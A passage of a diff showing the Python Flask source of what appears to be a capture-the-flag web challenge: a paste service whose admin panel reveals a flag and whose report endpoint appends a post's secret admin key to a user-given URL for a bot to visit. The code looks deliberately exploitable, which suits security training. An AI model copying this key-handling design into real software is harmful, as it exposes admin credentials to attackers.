+    })<span style="color:#f92672">.</span>encode()
+    <span style="color:#66d9ef">try</span>:
+        data <span style="color:#f92672">=</span> urllib<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>urlopen(
+            urllib<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>Request(
+                <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;https://recaptchaenterprise.googleapis.com/v1beta1/projects/</span><span style="color:#e6db74">{</span>PROJECT_ID<span style="color:#e6db74">}</span><span style="color:#e6db74">/assessments?key=</span><span style="color:#e6db74">{</span>RECAPTCHA_SECRET<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>,
+                headers<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#39;Content-Type&#39;</span>: <span style="color:#e6db74">&#39;application/json&#39;</span>},
+                data<span style="color:#f92672">=</span>body
+            )
+        )<span style="color:#f92672">.</span>read()
+    <span style="color:#66d9ef">except</span>:
+        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>
+
+    result <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>loads(data)
+    score <span style="color:#f92672">=</span> result<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;score&#34;</span>, <span style="color:#ae81ff">0</span>)
+    <span style="color:#66d9ef">assert</span> isinstance(score, float) <span style="color:#f92672">or</span> isinstance(score, int)
+
+    <span style="color:#66d9ef">return</span> score
+
+<span style="color:#75715e"># utils</span>
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">b64digest</span>(b):
+    <span style="color:#66d9ef">return</span> base64<span style="color:#f92672">.</span>urlsafe_b64encode(b)<span style="color:#f92672">.</span>strip(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;=&#34;</span>)<span style="color:#f92672">.</span>decode()
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_key</span>(id):
+    <span style="color:#66d9ef">assert</span> isinstance(id, str)
+    <span style="color:#66d9ef">return</span> b64digest(hashlib<span style="color:#f92672">.</span>sha256((APP_KEY <span style="color:#f92672">+</span> id)<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>digest())[:<span style="color:#ae81ff">10</span>]
+
+<span style="color:#75715e"># flask</span>
+app <span style="color:#f92672">=</span> flask<span style="color:#f92672">.</span>Flask(__name__)
+
+<span style="color:#a6e22e">@app</span><span style="color:#f92672">.</span>route(<span style="color:#e6db74">&#34;/&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;GET&#34;</span>])
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">index</span>():
+    <span style="color:#e6db74">&#34;&#34;&#34;Home&#34;&#34;&#34;</span>
+    <span style="color:#66d9ef">return</span> flask<span style="color:#f92672">.</span>render_template(
+        <span style="color:#e6db74">&#34;index.html&#34;</span>,
+        is_post<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>,
+        title<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Create Paste&#34;</span>,
+        sitekey<span style="color:#f92672">=</span>RECAPTCHA_SITE_KEY
+    )
+
+<span style="color:#a6e22e">@app</span><span style="color:#f92672">.</span>route(<span style="color:#e6db74">&#34;/post/&lt;string(length=16):id&gt;&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;GET&#34;</span>])
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_post</span>(id):
+    <span style="color:#e6db74">&#34;&#34;&#34;Read a ticket&#34;&#34;&#34;</span>
+    <span style="color:#75715e"># Get ticket by ID</span>
+    content <span style="color:#f92672">=</span> get_redis_conn(DB_TICKET)<span style="color:#f92672">.</span>get(id)
+    <span style="color:#66d9ef">if</span> content <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span>:
+        <span style="color:#66d9ef">return</span> flask<span style="color:#f92672">.</span>abort(<span style="color:#ae81ff">404</span>, <span style="color:#e6db74">&#34;not found&#34;</span>)
+
+    <span style="color:#75715e"># Check if admin</span>
+    content <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>loads(content)
+    key <span style="color:#f92672">=</span> flask<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;key&#34;</span>)
+    is_admin <span style="color:#f92672">=</span> isinstance(key, str) <span style="color:#f92672">and</span> get_key(id) <span style="color:#f92672">==</span> key
+
+    <span style="color:#66d9ef">return</span> flask<span style="color:#f92672">.</span>render_template(
+        <span style="color:#e6db74">&#34;index.html&#34;</span>,
+        <span style="color:#f92672">**</span>content,
+        is_post<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>,
+        panel<span style="color:#f92672">=</span><span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;&#34;&#34;
+</span><span style="color:#e6db74">&lt;strong&gt;Hello admin! Your flag is: </span><span style="color:#e6db74">{</span>FLAG<span style="color:#e6db74">}</span><span style="color:#e6db74">&lt;/strong&gt;&lt;br&gt;
+</span><span style="color:#e6db74">&lt;form id=&#34;delete-form&#34; method=&#34;post&#34; action=&#34;/api/delete&#34;&gt;
+</span><span style="color:#e6db74">    &lt;input name=&#34;id&#34; type=&#34;hidden&#34; value=&#34;</span><span style="color:#e6db74">{</span>id<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;&gt;
+</span><span style="color:#e6db74">    &lt;input name=&#34;key&#34; type=&#34;hidden&#34; value=&#34;</span><span style="color:#e6db74">{</span>key<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;&gt;
+</span><span style="color:#e6db74">    &lt;button id=&#34;modal-button-delete&#34; type=&#34;button&#34;&gt;Delete This Post&lt;/button&gt;
+</span><span style="color:#e6db74">&lt;/form&gt;
+</span><span style="color:#e6db74">&#34;&#34;&#34;</span> <span style="color:#66d9ef">if</span> is_admin <span style="color:#66d9ef">else</span> <span style="color:#e6db74">&#34;&#34;</span>,
+        url<span style="color:#f92672">=</span>flask<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>url,
+        sitekey<span style="color:#f92672">=</span>RECAPTCHA_SITE_KEY
+    )
+
+<span style="color:#a6e22e">@app</span><span style="color:#f92672">.</span>route(<span style="color:#e6db74">&#34;/api/new&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;POST&#34;</span>])
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">api_new</span>():
+    <span style="color:#e6db74">&#34;&#34;&#34;Create a new ticket&#34;&#34;&#34;</span>
+    <span style="color:#75715e"># Get parameters</span>
+    <span style="color:#66d9ef">try</span>:
+        title <span style="color:#f92672">=</span> flask<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>form[<span style="color:#e6db74">&#34;title&#34;</span>]
+        content <span style="color:#f92672">=</span> flask<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>form[<span style="color:#e6db74">&#34;content&#34;</span>]
+    <span style="color:#66d9ef">except</span>:
+        <span style="color:#66d9ef">return</span> flask<span style="color:#f92672">.</span>abort(<span style="color:#ae81ff">400</span>, <span style="color:#e6db74">&#34;Invalid request&#34;</span>)
+
+    <span style="color:#75715e"># Register a new ticket</span>
+    id <span style="color:#f92672">=</span> b64digest(os<span style="color:#f92672">.</span>urandom(<span style="color:#ae81ff">16</span>))[:<span style="color:#ae81ff">16</span>]
+    get_redis_conn(DB_TICKET)<span style="color:#f92672">.</span>set(
+        id, json<span style="color:#f92672">.</span>dumps({<span style="color:#e6db74">&#34;title&#34;</span>: title, <span style="color:#e6db74">&#34;content&#34;</span>: content})
+    )
+
+    <span style="color:#66d9ef">return</span> flask<span style="color:#f92672">.</span>jsonify({<span style="color:#e6db74">&#34;result&#34;</span>: <span style="color:#e6db74">&#34;OK&#34;</span>,
+                          <span style="color:#e6db74">&#34;message&#34;</span>: <span style="color:#e6db74">&#34;Post created! Click here to see your post&#34;</span>,
+                          <span style="color:#e6db74">&#34;action&#34;</span>: <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>flask<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>url_root<span style="color:#e6db74">}</span><span style="color:#e6db74">post/</span><span style="color:#e6db74">{</span>id<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>})
+
+<span style="color:#a6e22e">@app</span><span style="color:#f92672">.</span>route(<span style="color:#e6db74">&#34;/api/delete&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;POST&#34;</span>])
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">api_delete</span>():
+    <span style="color:#e6db74">&#34;&#34;&#34;Delete a ticket&#34;&#34;&#34;</span>
+    <span style="color:#75715e"># Get parameters</span>
+    <span style="color:#66d9ef">try</span>:
+        id <span style="color:#f92672">=</span> flask<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>form[<span style="color:#e6db74">&#34;id&#34;</span>]
+        key <span style="color:#f92672">=</span> flask<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>form[<span style="color:#e6db74">&#34;key&#34;</span>]
+    <span style="color:#66d9ef">except</span>:
+        <span style="color:#66d9ef">return</span> flask<span style="color:#f92672">.</span>abort(<span style="color:#ae81ff">400</span>, <span style="color:#e6db74">&#34;Invalid request&#34;</span>)
+
+    <span style="color:#66d9ef">if</span> get_key(id) <span style="color:#f92672">!=</span> key:
+        <span style="color:#66d9ef">return</span> flask<span style="color:#f92672">.</span>abort(<span style="color:#ae81ff">401</span>, <span style="color:#e6db74">&#34;Unauthorized&#34;</span>)
+
+    <span style="color:#75715e"># Delete</span>
+    <span style="color:#66d9ef">if</span> get_redis_conn(DB_TICKET)<span style="color:#f92672">.</span>delete(id) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
+        <span style="color:#66d9ef">return</span> flask<span style="color:#f92672">.</span>jsonify({<span style="color:#e6db74">&#34;result&#34;</span>: <span style="color:#e6db74">&#34;NG&#34;</span>, <span style="color:#e6db74">&#34;message&#34;</span>: <span style="color:#e6db74">&#34;Post not found&#34;</span>})
+
+    <span style="color:#66d9ef">return</span> flask<span style="color:#f92672">.</span>jsonify({<span style="color:#e6db74">&#34;result&#34;</span>: <span style="color:#e6db74">&#34;OK&#34;</span>, <span style="color:#e6db74">&#34;message&#34;</span>: <span style="color:#e6db74">&#34;This post was successfully deleted&#34;</span>})
+
+<span style="color:#a6e22e">@app</span><span style="color:#f92672">.</span>route(<span style="color:#e6db74">&#34;/api/report&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;POST&#34;</span>])
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">api_report</span>():
+    <span style="color:#e6db74">&#34;&#34;&#34;Reoprt an invitation ticket&#34;&#34;&#34;</span>
+    <span style="color:#75715e"># Get parameters</span>
+    <span style="color:#66d9ef">try</span>:
+        url <span style="color:#f92672">=</span> flask<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>form[<span style="color:#e6db74">&#34;url&#34;</span>]
+        reason <span style="color:#f92672">=</span> flask<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>form[<span style="color:#e6db74">&#34;reason&#34;</span>]
+        recaptcha_token <span style="color:#f92672">=</span> flask<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>form[<span style="color:#e6db74">&#34;g-recaptcha-response&#34;</span>]
+    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span>:
+        <span style="color:#66d9ef">return</span> flask<span style="color:#f92672">.</span>abort(<span style="color:#ae81ff">400</span>, <span style="color:#e6db74">&#34;Invalid request&#34;</span>)
+
+    <span style="color:#75715e"># Check reCAPTCHA</span>
+    score <span style="color:#f92672">=</span> verify_recaptcha(recaptcha_token)
+    <span style="color:#66d9ef">if</span> score <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>:
+        <span style="color:#66d9ef">return</span> flask<span style="color:#f92672">.</span>jsonify({<span style="color:#e6db74">&#34;result&#34;</span>: <span style="color:#e6db74">&#34;NG&#34;</span>, <span style="color:#e6db74">&#34;message&#34;</span>: <span style="color:#e6db74">&#34;Recaptcha verify failed&#34;</span>})
+    <span style="color:#66d9ef">if</span> score <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0.3</span>:
+        <span style="color:#66d9ef">return</span> flask<span style="color:#f92672">.</span>jsonify({<span style="color:#e6db74">&#34;result&#34;</span>: <span style="color:#e6db74">&#34;NG&#34;</span>, <span style="color:#e6db74">&#34;message&#34;</span>: <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Bye robot (score: </span><span style="color:#e6db74">{</span>score<span style="color:#e6db74">}</span><span style="color:#e6db74">)&#34;</span>})
+
+    <span style="color:#75715e"># Check URL</span>
+    parsed <span style="color:#f92672">=</span> urllib<span style="color:#f92672">.</span>parse<span style="color:#f92672">.</span>urlparse(url<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;?&#39;</span>, <span style="color:#ae81ff">1</span>)[<span style="color:#ae81ff">0</span>])
+    <span style="color:#66d9ef">if</span> len(parsed<span style="color:#f92672">.</span>query) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>:
+        <span style="color:#66d9ef">return</span> flask<span style="color:#f92672">.</span>jsonify({<span style="color:#e6db74">&#34;result&#34;</span>: <span style="color:#e6db74">&#34;NG&#34;</span>, <span style="color:#e6db74">&#34;message&#34;</span>: <span style="color:#e6db74">&#34;Query string is not allowed&#34;</span>})
+    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>parsed<span style="color:#f92672">.</span>scheme<span style="color:#e6db74">}</span><span style="color:#e6db74">://</span><span style="color:#e6db74">{</span>parsed<span style="color:#f92672">.</span>netloc<span style="color:#e6db74">}</span><span style="color:#e6db74">/&#39;</span> <span style="color:#f92672">!=</span> flask<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>url_root:
+        <span style="color:#66d9ef">return</span> flask<span style="color:#f92672">.</span>jsonify({<span style="color:#e6db74">&#34;result&#34;</span>: <span style="color:#e6db74">&#34;NG&#34;</span>, <span style="color:#e6db74">&#34;message&#34;</span>: <span style="color:#e6db74">&#34;Invalid host&#34;</span>})
+
+    <span style="color:#75715e"># Parse path</span>
+    adapter <span style="color:#f92672">=</span> app<span style="color:#f92672">.</span>url_map<span style="color:#f92672">.</span>bind(flask<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>host)
+    endpoint, args <span style="color:#f92672">=</span> adapter<span style="color:#f92672">.</span>match(parsed<span style="color:#f92672">.</span>path)
+    <span style="color:#66d9ef">if</span> endpoint <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;get_post&#34;</span> <span style="color:#f92672">or</span> <span style="color:#e6db74">&#34;id&#34;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> args:
+        <span style="color:#66d9ef">return</span> flask<span style="color:#f92672">.</span>jsonify({<span style="color:#e6db74">&#34;result&#34;</span>: <span style="color:#e6db74">&#34;NG&#34;</span>, <span style="color:#e6db74">&#34;message&#34;</span>: <span style="color:#e6db74">&#34;Invalid endpoint&#34;</span>})
+
+    <span style="color:#75715e"># Check ID</span>
+    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> get_redis_conn(DB_TICKET)<span style="color:#f92672">.</span>exists(args[<span style="color:#e6db74">&#34;id&#34;</span>]):
+        <span style="color:#66d9ef">return</span> flask<span style="color:#f92672">.</span>jsonify({<span style="color:#e6db74">&#34;result&#34;</span>: <span style="color:#e6db74">&#34;NG&#34;</span>, <span style="color:#e6db74">&#34;message&#34;</span>: <span style="color:#e6db74">&#34;Invalid ID&#34;</span>})
+
+    key <span style="color:#f92672">=</span> get_key(args[<span style="color:#e6db74">&#34;id&#34;</span>])
+    message <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;URL: </span><span style="color:#e6db74">{</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">?key=</span><span style="color:#e6db74">{</span>key<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Reason: </span><span style="color:#e6db74">{</span>reason<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+
+    <span style="color:#66d9ef">try</span>:
+        get_redis_conn(DB_BOT)<span style="color:#f92672">.</span>rpush(
+            <span style="color:#e6db74">&#39;report&#39;</span>, message[:MESSAGE_LENGTH_LIMIT]
+        )
+    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span>:
+        <span style="color:#66d9ef">return</span> flask<span style="color:#f92672">.</span>jsonify({<span style="color:#e6db74">&#34;result&#34;</span>: <span style="color:#e6db74">&#34;NG&#34;</span>, <span style="color:#e6db74">&#34;message&#34;</span>: <span style="color:#e6db74">&#34;Post failed&#34;</span>})
+
+    <span style="color:#66d9ef">return</span> flask<span style="color:#f92672">.</span>jsonify({<span style="color:#e6db74">&#34;result&#34;</span>: <span style="color:#e6db74">&#34;OK&#34;</span>, <span style="color:#e6db74">&#34;message&#34;</span>: <span style="color:#e6db74">&#34;Successfully reported&#34;</span>})
+
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+    app<span style="color:#f92672">.</span>run()
+</code></pre></div>
 
 
 
